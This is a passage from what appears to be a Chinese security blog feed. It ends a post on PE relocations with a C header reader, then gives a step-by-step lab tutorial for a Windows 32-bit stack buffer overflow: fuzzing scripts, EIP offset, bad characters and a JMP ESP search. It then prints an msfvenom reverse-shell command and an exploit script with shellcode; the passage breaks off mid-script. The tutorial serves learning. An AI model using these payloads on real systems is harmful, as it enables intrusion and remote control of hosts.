.........<span class="hljs-number">676@6E6</span><br><span class="hljs-number">00008a10</span>: <span class="hljs-number">4d36 5f36</span> <span class="hljs-number">6436 6c36</span> <span class="hljs-number">7e36 8336</span> <span class="hljs-number">8b36 9d36</span>  M<span class="hljs-number">6_6d6l6</span>~<span class="hljs-number">6.6.6.6</span><br><span class="hljs-number">00008a20</span>: a236 aa36 d036 d436 d836 dc36 <span class="hljs-number">3f37 4d37</span>  .<span class="hljs-number">6.6.6.6</span>.<span class="hljs-number">6.6?7M7</span><br><span class="hljs-number">00008a30</span>: <span class="hljs-number">5237 5a37</span> a737 cb37 d437 da37 <span class="hljs-number">013</span>a <span class="hljs-number">113</span>a  R<span class="hljs-number">7Z7.7.7</span>.<span class="hljs-number">7</span>.<span class="hljs-number">7</span>.:.:<br><span class="hljs-number">00008a40</span>: <span class="hljs-number">223</span>a <span class="hljs-number">353</span>a <span class="hljs-number">983</span>a ec3a f03a f43a f83a <span class="hljs-number">263</span>b  &quot;:<span class="hljs-number">5</span>:.:.:.:.:.:&amp;<span class="hljs-comment">;</span><br><span class="hljs-number">00008a50</span>: <span class="hljs-number">2</span>b3b <span class="hljs-number">3d</span>3b <span class="hljs-number">7d</span>3b <span class="hljs-number">8d</span>3b b33b b83b d93b de3b  +<span class="hljs-comment">;=;&#125;;.;.;.;.;.;</span><br><span class="hljs-number">00008a60</span>: ec3b <span class="hljs-number">603</span>c <span class="hljs-number">693</span>c <span class="hljs-number">723</span>c f63c fb3c <span class="hljs-number">0d</span>3d <span class="hljs-number">223d</span>  .<span class="hljs-comment">;`&lt;i&lt;r&lt;.&lt;.&lt;.=&quot;=</span><br><span class="hljs-number">00008a70</span>: <span class="hljs-number">313d</span> <span class="hljs-number">393d</span> <span class="hljs-number">5</span>c3d <span class="hljs-number">7</span>b3d <span class="hljs-number">363</span>e <span class="hljs-number">3</span>b3e <span class="hljs-number">4d</span>3e <span class="hljs-number">6</span>b3e  <span class="hljs-number">1</span>=<span class="hljs-number">9</span>=\=&#123;=<span class="hljs-number">6</span>&gt;<span class="hljs-comment">;&gt;M&gt;k&gt;</span><br><span class="hljs-number">00008a80</span>: <span class="hljs-number">763</span>f <span class="hljs-number">0000 0020</span> <span class="hljs-number">0100</span> a<span class="hljs-number">800 0000</span> <span class="hljs-number">2830 3730</span>  v?... ......(<span class="hljs-number">070</span><br></code></pre></div></td></tr></table></figure><ul><li>VirtualAddress : 11000h</li><li>SizeOfBlock : 84h (84h - 8h) / 2h(WORD) = 3Eh (62)</li><li>重定位数据1 : 360f</li><li>重定位数据2 : 3637</li><li>重定位数据61 : 763f</li><li>结束 : 0000</li></ul><p>(重定位数据)61 + 1(结束) = 62</p><br/><p>查看重定位数据：<br>原始数据 : 0F36h<br>TypeOffset : 360Fh<br>TypeOffset 高4 : 3h<br>TypeOffset 低12: 60Fh<br>低 12加 VirtualAddress : 11000h + 60Fh = 1160Fh<br>转换为文件偏移地址: 1160Fh , </p><p>∆k = 11000h - 400h = 10C00h</p><p>File Offset = 1160Fh - 10C00h = A0Fh</p><p>重定位所需要的数据1 指向的数据<br>xxd -s 0xA0F -l 0x4 mydll.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000a0f</span>: <span class="hljs-number">0</span>cb<span class="hljs-number">0</span> <span class="hljs-number">0110</span>                                ....<br></code></pre></div></td></tr></table></figure><br/><p>执行 PE 文件前，加载程序在进行重定位的时候，会用 PE 文件在内存中的实际映像地址减 PE 文件所要求的映像地址，根据重定位类型的不同将差值添加到相应的地址数据中</p><br/><h2 id="Easy-Code"><a href="#Easy-Code" class="headerlink" title="Easy Code"></a>Easy Code</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br>IMAGE_DOS_HEADER image_dos;<br>IMAGE_FILE_HEADER image_file;<br>IMAGE_OPTIONAL_HEADER image_option;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">read_pe</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* read_pe;<br>    <span class="hljs-keyword">errno_t</span>* err;<br>    <span class="hljs-keyword">if</span> ((err = fopen_s(&amp;read_pe, <span class="hljs-string">&quot;C:\\Users\\0x20C\\Desktop\\dll hijacking\\Invoke-Dll.exe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Open Fail!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Open Done!\n&quot;</span>);<br><br>    fread(&amp;image_dos, <span class="hljs-keyword">sizeof</span>(IMAGE_DOS_HEADER), <span class="hljs-number">1</span>, read_pe);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e_magic : %04X\n&quot;</span>, image_dos.e_magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PE Header Start(e_lfanew) : %08X\n&quot;</span>, image_dos.e_lfanew);<br>    DWORD pe_header = image_dos.e_lfanew;<br><br>    <span class="hljs-comment">// IMAGE_FILE_HEADER offset</span><br>    DWORD file_offset = pe_header + <span class="hljs-keyword">sizeof</span>(DWORD);<br>    fseek(read_pe, file_offset, SEEK_SET);<br>    fread(&amp;image_file, <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER), <span class="hljs-number">1</span>, read_pe);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfOptionalHeader : %04X\n&quot;</span>, image_file.SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">// IMAGE_OPTIONAL_HEADER offset</span><br>    DWORD option_offset = file_offset + <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER);<br>    fseek(read_pe, option_offset, SEEK_SET);<br>    fread(&amp;image_option, <span class="hljs-keyword">sizeof</span>(IMAGE_OPTIONAL_HEADER), <span class="hljs-number">1</span>, read_pe);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SectionAlignment : %08X\n&quot;</span>, image_option.SectionAlignment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;FileAlignment : %08X\n&quot;</span>, image_option.FileAlignment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfImage : %08X\n&quot;</span>, image_option.SizeOfImage);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMPORT : %08X\n&quot;</span>, image_option.DataDirectory[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BASERELOC : %08X\n&quot;</span>, image_option.DataDirectory[<span class="hljs-number">5</span>]);<br><br>    fclose(read_pe);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//</span><br>    read_pe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Out</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">File</span> Open Done!<br><span class="hljs-attribute">e_magic</span> : <span class="hljs-number">5</span>A<span class="hljs-number">4</span>D<br><span class="hljs-attribute">PE</span> Header Start(e_lfanew) : <span class="hljs-number">000000</span>E<span class="hljs-number">8</span><br><span class="hljs-attribute">SizeOfOptionalHeader</span> : <span class="hljs-number">00</span>E<span class="hljs-number">0</span><br><span class="hljs-attribute">SectionAlignment</span> : <span class="hljs-number">00001000</span><br><span class="hljs-attribute">FileAlignment</span> : <span class="hljs-number">00000200</span><br><span class="hljs-attribute">SizeOfImage</span> : <span class="hljs-number">00020000</span><br><span class="hljs-attribute">IMPORT</span> : <span class="hljs-number">0001</span>B<span class="hljs-number">1</span>D<span class="hljs-number">0</span><br><span class="hljs-attribute">BASERELOC</span> : <span class="hljs-number">0001</span>F<span class="hljs-number">000</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li>《加密与解密 第4版》</li><li>MSDN</li><li><a href="https://blog.csdn.net/yan_star/article/details/79605860">C语言——PE头读写</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easy Windows Buffer Overflow</title>
    <link href="/2020/11/21/11_07_easy_buffer_overflow/"/>
    <url>/2020/11/21/11_07_easy_buffer_overflow/</url>
    
    <content type="html"><![CDATA[<p>Easy Windows 32bit Buffer Overflow</p><a id="more"></a><ul><li>Fuzz</li><li>Find EIP(offset)</li><li>Overwriting the EIP</li><li>Find Bad Characters</li><li>Find Return Address</li><li>Exploit</li></ul><br/><h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>fuzz max</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 10000)&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure><p>缩小范围</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 2320)&quot;</span> | nc 192.168.0.106 2233<br>python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 2318 + &#x27;B&#x27; * 4)&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure><br/><p>可以编写脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> socket<br><br><br>host = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port = <span class="hljs-number">2233</span><br>size = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> (size &lt; <span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">try</span>:<br>        data = <span class="hljs-string">&quot;A&quot;</span> * size<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(<span class="hljs-number">8</span>)<br>        s.connect((host, port))<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br>        s.send(data)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer size &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(size)<br>        <span class="hljs-comment"># print(&quot;[*] Buffer data : \n&#123;&#125;&quot;.format(data))</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br><br>        size += <span class="hljs-number">100</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        s.close()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Exit!&quot;</span><br>        sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Find it!&quot;</span><br>        print(<span class="hljs-string">&quot;[!]&quot;</span>, e)<br>        sys.exit(<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p>Out</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-string">[*]</span> Connent...<br><span class="hljs-string">[*]</span> Connect Done<br><span class="hljs-string">[*]</span> Send buffer<br><span class="hljs-string">[*]</span> Buffer size <span class="hljs-number">2400</span><br><br><span class="hljs-string">[!]</span> Find it!<br><span class="hljs-string">[!]</span> timed <span class="hljs-keyword">out</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Find-EIP-Finding-the-Offset"><a href="#Find-EIP-Finding-the-Offset" class="headerlink" title="Find EIP (Finding the Offset)"></a>Find EIP (Finding the Offset)</h2><p><code>msf-pattern_create -l 2400</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;Aa0Aa1Aa2Aa3Aa4A...Cz0Cz1Cz2Cz3&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure><p>EIP 被覆盖: <code>39794338</code> ， 得到 EIP 起始位置：2306</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ msf-pattern_offset -l 2400 -q 39794338<br>[*] Exact match at offset 2306<br></code></pre></div></td></tr></table></figure><br/><h2 id="Overwriting-the-EIP"><a href="#Overwriting-the-EIP" class="headerlink" title="Overwriting the EIP"></a>Overwriting the EIP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><br><br><span class="hljs-comment"># EIP start : 0x39794338</span><br>offset    = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">2306</span><br>EIP       = <span class="hljs-string">&quot;\x42&quot;</span> * <span class="hljs-number">4</span><br>shellcode = offset + EIP<br><br>host = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port = <span class="hljs-number">2233</span><br><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">3</span>)<br>    s.connect((host, port))<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br><br>    s.send(shellcode)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br><br>    s.close()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[!] Exit!&quot;</span><br>    sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Error! \n[!] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>    sys.exit(<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p>EIP 被 <code>BBBB</code> 覆盖: <code>42424242</code></p><br/><h2 id="Find-Bad-Characters"><a href="#Find-Bad-Characters" class="headerlink" title="Find Bad Characters"></a>Find Bad Characters</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">bad_chars = <span class="hljs-string">&quot;\x01...\xff&quot;</span><br>offset    = <span class="hljs-string">&#x27;\x41&#x27;</span> * <span class="hljs-number">2306</span><br>eip       = <span class="hljs-string">&#x27;\x42&#x27;</span> * <span class="hljs-number">4</span><br>shellcode = offset + eip + bad_chars<br></code></pre></div></td></tr></table></figure><p>ESP: 0262EE54 -&gt; dump</p><p>注意，检查 ESP 指向的内存区域的数据</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">0262EE44 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 42 </span>42<span class="hljs-number"> 42 </span>42  AAAABBBB<br>0262EE4C <span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span>08  <br>0262EE54 <span class="hljs-number"> 09 </span>0A 0B 0C 0D 0E 0F<span class="hljs-number"> 10 </span> ....<br>0262EE5C <span class="hljs-number"> 11 </span>12<span class="hljs-number"> 13 </span>14<span class="hljs-number"> 15 </span>16<span class="hljs-number"> 17 </span>18  <br>0262EE64 <span class="hljs-number"> 19 </span>1A 1B 1C 1D 1E 1F<span class="hljs-number"> 20 </span> <br>0262EE6C <span class="hljs-number"> 21 </span>22<span class="hljs-number"> 23 </span>24<span class="hljs-number"> 25 </span>26<span class="hljs-number"> 27 </span>28  !&quot;<span class="hljs-comment">#$%&amp;&#x27;(</span><br>0262EE74 <span class="hljs-number"> 29 </span>2A 2B 2C 2D 2E 2F<span class="hljs-number"> 30 </span> )*+,-./0<br>0262EE7C <span class="hljs-number"> 31 </span>32<span class="hljs-number"> 33 </span>34<span class="hljs-number"> 35 </span>36<span class="hljs-number"> 37 </span>38  12345678<br>0262EE84 <span class="hljs-number"> 39 </span>3A 3B 3C 3D 3E 3F<span class="hljs-number"> 40 </span> 9:;&lt;=&gt;?@<br>0262EE8C <span class="hljs-number"> 41 </span>42<span class="hljs-number"> 43 </span>44<span class="hljs-number"> 45 </span>46<span class="hljs-number"> 47 </span>48  ABCDEFGH<br>0262EE94 <span class="hljs-number"> 49 </span>4A 4B 4C 4D 4E 4F<span class="hljs-number"> 50 </span> IJKLMNOP<br>0262EE9C <span class="hljs-number"> 00 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41  .AAAAAAA     &lt;- 51<br></code></pre></div></td></tr></table></figure><br/><h2 id="Find-Return-Address"><a href="#Find-Return-Address" class="headerlink" title="Find Return Address"></a>Find Return Address</h2><p><code>!mona modules</code> : 列出 modules</p><p>ASM -&gt; HEX</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ msf-nasm_shell <br>nasm &gt; JMP ESP<br>00000000  FFE4              jmp esp<br></code></pre></div></td></tr></table></figure><br/><p>寻找：<code>JMP ESP</code></p><p><code>!mona find -s &quot;\xff\xe4&quot; -m Server.exe</code></p><p>or</p><p><code>!mona jmp -r esp</code></p><ul><li>0x1120110D</li></ul><br/><p>小端显示</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1120110D&quot;</span> | tac -rs .. | <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tr -d &#x27;\n&#x27;)</span>&quot;</span><br><br><span class="hljs-comment"># 0D112011</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>生成 shellcode</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.0.100 <span class="hljs-attribute">LPORT</span>=443 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;\x00\x51&quot;</span> -f c<br></code></pre></div></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><br><br><span class="hljs-comment"># msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b &quot;\x00\x51&quot; -f c</span><br>shellcode = (<br><span class="hljs-string">&quot;\xda\xd2\xb8\x2c\x1e\xdd\x7b\xd9\x74\x24\xf4\x5b\x31\xc9\xb1&quot;</span><br><span class="hljs-string">&quot;\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x38\xfc\x28\x87\xa8\x82&quot;</span><br><span class="hljs-string">&quot;\xd3\x78\x28\xe3\x5a\x9d\x19\x23\x38\xd5\x09\x93\x4a\xbb\xa5&quot;</span><br><span class="hljs-string">&quot;\x58\x1e\x28\x3e\x2c\xb7\x5f\xf7\x9b\xe1\x6e\x08\xb7\xd2\xf1&quot;</span><br><span class="hljs-string">&quot;\x8a\xca\x06\xd2\xb3\x04\x5b\x13\xf4\x79\x96\x41\xad\xf6\x05&quot;</span><br><span class="hljs-string">&quot;\x76\xda\x43\x96\xfd\x90\x42\x9e\xe2\x60\x64\x8f\xb4\xfb\x3f&quot;</span><br><span class="hljs-string">&quot;\x0f\x36\x28\x34\x06\x20\x2d\x71\xd0\xdb\x85\x0d\xe3\x0d\xd4&quot;</span><br><span class="hljs-string">&quot;\xee\x48\x70\xd9\x1c\x90\xb4\xdd\xfe\xe7\xcc\x1e\x82\xff\x0a&quot;</span><br><span class="hljs-string">&quot;\x5d\x58\x75\x89\xc5\x2b\x2d\x75\xf4\xf8\xa8\xfe\xfa\xb5\xbf&quot;</span><br><span class="hljs-string">&quot;\x59\x1e\x4b\x13\xd2\x1a\xc0\x92\x35\xab\x92\xb0\x91\xf0\x41&quot;</span><br><span class="hljs-string">&quot;\xd8\x80\x5c\x27\xe5\xd3\x3f\x98\x43\x9f\xad\xcd\xf9\xc2\xbb&quot;</span><br><span class="hljs-string">&quot;\x10\x8f\x78\x89\x13\x8f\x82\xbd\x7b\xbe\x09\x52\xfb\x3f\xd8&quot;</span><br><span class="hljs-string">&quot;\x17\xe3\xdd\xc9\x6d\x8c\x7b\x98\xcc\xd1\x7b\x76\x12\xec\xff&quot;</span><br><span class="hljs-string">&quot;\x73\xea\x0b\x1f\xf6\xef\x50\xa7\xea\x9d\xc9\x42\x0d\x32\xe9&quot;</span><br><span class="hljs-string">&quot;\x46\x6e\xd5\x79\x0a\x5f\x70\xfa\xa9\x9f&quot;</span>)<br><br><br>host    = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port    = <span class="hljs-number">2233</span><br><br>offset  = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">2306</span><br>EIP     = <span class="hljs-string">&quot;\x0D\x11\x20\x11&quot;</span><br>nop     = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">20</span><br>evilbuf = offset + EIP + nop + shellcode<br><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">5</span>)<br>    s.connect((host, port))<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br><br>    s.send(evilbuf)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br>    s.close()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Exit!&quot;</span><br>    sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Error! \n[!] 